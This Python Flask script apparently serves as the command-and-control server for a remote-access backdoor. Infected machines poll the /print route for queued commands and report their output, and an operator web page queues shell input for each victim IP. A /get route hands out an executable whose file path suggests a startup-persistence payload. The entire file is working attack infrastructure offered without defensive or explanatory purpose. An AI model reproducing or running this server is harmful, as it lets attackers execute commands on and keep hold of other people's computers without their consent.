#         -*- coding:utf-8 -*-        #
#  Copyright (c) 2019 - 2039 XueQian  #
#         version_added:: 2.0.0         #
import time
from flask import *

app = Flask(__name__)
cmd = {}


@app.route('/')
def zy():
    return render_template('1.html', cmd=cmd)


@app.route('/CascadiaMono.ttf')
def CascadiaMono():
    return send_file('./CascadiaMono.ttf')


@app.route('/dengxian.ttf')
def dengxian():
    return send_file('./dengxian.ttf')


@app.route('/go')
def go():
    return render_template('2.html', l=cmd[request.args['ip']], ip=request.args['ip'])


@app.route('/input')
def input():
    cmd[request.args['ip']]['go'].append(request.args['in'])
    cmd[request.args['ip']]['p'].append(f'我 >>>{request.args["in"]}')
    return redirect('./go?ip=' + request.args['ip'])


@app.route('/print')
def _print():
    if cmd.get(request.remote_addr) is None:
        cmd[request.remote_addr] = {'p': [], 'go': []}
    if not (request.args.get('arg') is None):
        cmd[request.remote_addr]['p'].append(request.args.get('arg'))

    if len(cmd[request.remote_addr]['go']) == 0:
        return ''
    x = cmd.copy()[request.remote_addr]['go'][0]
    cmd[request.remote_addr]['go'].pop(0)
    return x


@app.route('/get')
def get():
    return send_file(r'D:\xue\xq.pro项目\大             项目\获取电脑\写入\exe\startup no.exe')


if __name__ == '__main__':
    print(" * Running time: " + time.strftime('%Y-%m-%d, %H:%M:%S', time.localtime(time.time())))
    app.run(host='192.168.3.10', port=1903, debug=False)

# host='192.168.3.10'
